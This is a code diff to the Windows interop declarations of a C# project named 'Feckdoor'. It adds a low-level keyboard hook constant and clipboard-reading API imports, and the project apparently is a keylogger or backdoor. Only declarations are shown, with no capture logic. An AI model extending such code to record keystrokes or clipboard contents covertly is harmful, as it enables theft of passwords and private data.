@@ -8,8 +8,9 @@ namespace Feckdoor
 		// Constants
 		public const int WM_KEYDOWN = 0x0100;
 		public const int WM_SYSKEYDOWN = 0x0105;
+		public const int WH_KEYBOARD_LL = 13;
+		public const int CF_UNICODETEXT = 13;
 		public static IntPtr _hookID = IntPtr.Zero;
-		public static int WH_KEYBOARD_LL = 13;
 
 		// Delegates
 
@@ -78,9 +79,6 @@ namespace Feckdoor
 
 		// Window-related exports
 
-		[DllImport("kernel32.dll")]
-		public static extern IntPtr GetConsoleWindow();
-
 		[DllImport("user32.dll")]
 		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
@@ -93,9 +91,22 @@ namespace Feckdoor
 		[DllImport("user32.dll", SetLastError = true)]
 		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
-		// Other exports
+		// Clipboard-related exports
+		[DllImport("user32.dll", SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		public static extern bool OpenClipboard([In, Optional] IntPtr hWnd);
 
-		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		public static extern IntPtr GetModuleHandle(string lpModuleName);
+		[DllImport("user32.dll", SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		public static extern bool CloseClipboard();
+
+		[DllImport("user32.dll", SetLastError = true)]
+		public unsafe static extern int GetPriorityClipboardFormat([In] uint *priorityList, [In] int formats);
+
+		[DllImport("user32.dll", SetLastError = true)]
+		public static extern IntPtr GetClipboardData([In] uint format);
+
+		[DllImport("user32.dll")]
+		public static extern int GetClipboardSequenceNumber();
 	}
 }
